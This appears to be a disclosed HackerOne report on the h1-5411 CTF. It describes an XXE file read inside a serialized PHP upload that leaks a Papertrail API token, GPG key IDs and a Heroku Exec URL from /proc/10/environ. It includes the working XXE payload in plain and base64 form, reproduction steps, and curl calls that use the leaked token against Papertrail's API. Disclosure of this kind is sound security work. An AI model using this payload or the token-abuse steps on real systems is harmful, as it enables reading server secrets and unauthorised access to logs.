@@ -1,0 +1,190 @@
+ReportLink:https://hackerone.com/reports/416123
+WeaknessName:Improper Access Control - Generic
+Reporter:https://hackerone.com/osintopsec
+ReportedTo:h1-5411-CTF(h1-5411-ctf)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:22.10.2018 20:38:44
+
+Summary:
+
+Hi there dear CTF staff!
+
+First of all a huge thank you for the great challenge you put up! I've found it super exciting and the learning curve has been steep.
+
+For this case, I was first wondering if this is a part of the actual CTF, but after some inspecting, it surely doesn't seem so! I did even reach out to you via Twitter for initial confirmation.
+
+{F352815}
+
+
+The Case
+=====================
+
+During some serious Meme generation and attempting on the CTF, I managed to reach a situation where I was able to read files from the local filesystem via XXE. After some poking around on the filesystem I was able to determin the Apache2 process id by chaining file discoveries:
+-> /etc/apache2/apache2.conf
+-> /etc/apache2/envvars
+-> /var/run/apache2$SUFFIX/apache2.pid, (Notes: $SUFFIX = "" and the file contains "10")
+-> /proc/10/environ
+
+Which contains the environment data for Apache2 as (redacted for your good!):
+
+```
+HEROKU_EXEC_URL=https://exec-manager.heroku.com/ea0bc596-REDACTED
+PHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi
+APACHE_CONFDIR=/etc/apache2
+PHP_INI_DIR=/usr/local/etc/php
+SHLVL=1
+PHP_EXTRA_BUILD_DEPS=apache2-dev
+PORT=58345
+PHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie
+APACHE_RUN_DIR=/var/run/apache2
+PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2
+PHP_MD5=
+PHP_VERSION=7.2.10
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+GPG_KEYS=1729F83938-REDACTED B1B44D8F021E-REDACTED
+PHP_ASC_URL=https://secure.php.net/get/php-7.2.10.tar.xz.asc/from/this/mirror
+PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2
+_=/usr/sbin/apache2ctl
+PHP_URL=https://secure.php.net/get/php-7.2.10.tar.xz/from/this/mirror
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+PAPERTRAIL_API_TOKEN=ii6r9Ze-REDACTED
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+PHPIZE_DEPS=autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c
+PWD=/app
+PHP_SHA256=01c2154a3a8e3c0818acbdbc1a956832c828a0380ce6d1d14fea495ea21804f0
+APACHE_ENVVARS=/etc/apache2/envvars
+DYNO=web.1
+```
+
+What caught my eye were Papertrail API-token and GPG-keypair. Also Heroku Exec url is present.
+
+{F352822}
+
+So, as the ideas of this actually being a part of the CTF fading away and having nice previous record of finding and utilizing API-keys, I decided to test the Papertrail token for myself. And how about it? Works!
+
+After some poking around I landed on this:
+
+```
+curl -i -H "X-Papertrail-Token: ii6r9Ze-REDACTED" https://papertrailapp.com/api/v1/events/search.json?system_id=23562-REDACTED
+HTTP/1.1 200 OK
+Date: Sat, 29 Sep 2018 11:29:58 GMT
+Strict-Transport-Security: max-age=31536000
+X-Frame-Options: SAMEORIGIN
+X-Rate-Limit-Limit: 25
+X-Rate-Limit-Remaining: 24
+X-Rate-Limit-Reset: 2
+X-Shibboleet: if you see this, we'd like to get you a thank you espresso
+X-Runtime: 440
+ETag: "6fa205988ad388afc-REDACTED"
+Cache-Control: private, max-age=0, must-revalidate
+Content-Length: 636600
+Status: 200 OK
+Content-Type: application/json; charset=utf-8
+
+{
+	"min_id": "98264920-REDACTED",
+	"max_id": "9826557-REDACTED",
+	"events": [{
+			"id": "9826492-REDACTED",
+			"source_ip": "54.205.-REDACTED",
+			"program": "heroku/router",
+			"message": "at=info method=GET path=\"/vendor/font-awesome/css/font-awesome.min.css\" host=h1-5411.h1ctf.com request_id=5fb495c5-7237-455b-b79d--REDACTED fwd=\"192.130.-REDACTED\" dyno=web.1 connect=0ms service=3ms status=200 bytes=7354 protocol=https ",
+			"received_at": "2018-09-29T04:04:09-07:00",
+			"generated_at": "2018-09-29T04:04:09-07:00",
+			"display_received_at": "Sep 29 04:04:09",
+			"source_id": 23562-REDACTED,
+			"source_name": "h1-5411-2018-ctf",
+			"hostname": "h1-5411-2018-ctf",
+			"severity": "Info",
+			"facility": "Local3"
+		}, {
+			"id": "982649204-REDACTED",
+			"source_ip": "50.19.-REDACTED",
+			"program": "heroku/router",
+			"message": "at=info method=GET path=\"/vendor/jquery-easing/jquery.easing.min.js\" host=h1-5411.h1ctf.com request_id=8d7e3947-cba9-4661-a34c-1b385021600c fwd=\"192.130.-REDACTED\" dyno=web.1 connect=1ms service=2ms status=200 bytes=1130 protocol=https ",
+			"received_at": "2018-09-29T04:04:09-07:00",
+			"generated_at": "2018-09-29T04:04:09-07:00",
+			"display_received_at": "Sep 29 04:04:09",
+			"source_id": 23562-REDACTED,
+			"source_name": "h1-5411-2018-ctf",
+			"hostname": "h1-5411-2018-ctf",
+			"severity": "Info",
+			"facility": "Local3"
+		},
+........ And so on.
+```
+
+And this particular header caught my eye:
+
+```
+X-Shibboleet: if you see this, we'd like to get you a thank you espresso
+```
+
+So here I am, writing a report about this.
+
+Steps to reproduce
+=====================
+A good report almost always requires steps to reproduce. My apologies if this is something stupid and the read could be done more elegantly! I'll also skip the first parts of the challenge, since they're not neede to reproduce.
+
+1. Prepare the following serialized PHP-object  with a XXE payloadfor injection
+```
+a:2:{i:0;s:93:"../data/memes/1538175596-8bc89487fb699b9a757aaeec7cc4f19bdcfcb436cdbeac3389f8a91908721f17.txt";i:1;O:10:"ConfigFile":1:{s:10:"config_raw";s:276:"<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=file:///proc/10/environ'>]><meme><toptext>qwerty</toptext><bottomtext>asdasd</bottomtext><template>&xxe;</template><type>TEXT</type></meme>";}}
+```
+
+which is the following base64-string
+
+```
+YToyOntpOjA7czo5MzoiLi4vZGF0YS9tZW1lcy8xNTM4MTc1NTk2LThiYzg5NDg3ZmI2OTliOWE3NTdhYWVlYzdjYzRmMTliZGNmY2I0MzZjZGJlYWMzMzg5ZjhhOTE5MDg3MjFmMTcudHh0IjtpOjE7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyNzY6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPjwhRU5USVRZIHh4ZSBTWVNURU0gJ3BocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZmlsZTovLy9wcm9jLzEwL2Vudmlyb24nPl0+PG1lbWU+PHRvcHRleHQ+cXdlcnR5PC90b3B0ZXh0Pjxib3R0b210ZXh0PmFzZGFzZDwvYm90dG9tdGV4dD48dGVtcGxhdGU+Jnh4ZTs8L3RlbXBsYXRlPjx0eXBlPlRFWFQ8L3R5cGU+PC9tZW1lPiI7fX0=
+```
+and save it as "memes.memepack" -file
+
+2. Navigate to https://h1-5411.h1ctf.com/import_memes_2.0.php
+3. Click "Choose file" and open the newly created "memes.memepack"-file
+4. Open browser developer console or log requests with a proxy
+5. Click "Import"
+6. Inspect developer console or proxy, which should look similar to
+{F352830}
+7. Base64-decode parameter "Template Location" after "=>", which contains the file /proc/10/environ -file
+8. Profit! 
+9. Get the Papertrail API-token
+10. Prepare Curl for example as following
+ ```
+curl -i -H "X-Papertrail-Token: [INSERT PAPERTRAIL API-TOKEN HERE]"  https://papertrailapp.com/api/v1/events/search.json?q=error
+```
+
+11. Inspect that response headers look similar to this:
+```
+curl -i -H "X-Papertrail-Token: ii6r9Ze-REDACTED" https://papertrailapp.com/api/v1/events/search.json?q=error
+HTTP/1.1 200 OK
+Date: Sat, 29 Sep 2018 13:08:00 GMT
+Strict-Transport-Security: max-age=31536000
+X-Frame-Options: SAMEORIGIN
+X-Rate-Limit-Limit: 25
+X-Rate-Limit-Remaining: 24
+X-Rate-Limit-Reset: 5
+X-Shibboleet: if you see this, we'd like to get you a thank you espresso
+X-Runtime: 528
+ETag: "7207607ce216ca0fc-REDACTEDc"
+Cache-Control: private, max-age=0, must-revalidate
+Content-Length: 498309
+Status: 200 OK
+Content-Type: application/json; charset=utf-8
+```
+12. Double profit!
+
+## Impact
+
+The main impact of this vulnerability seems to be this!
+```
+X-Shibboleet: if you see this, we'd like to get you a thank you espresso
+```
+
+However, a malicious individual would propably harvest hacker IP-addresses and see what the other CTF contestants are doing on the box using the Papertrail token. Also GPG-keys should be kept private, as Heroku Exec manager-links.
+
+{F352838}
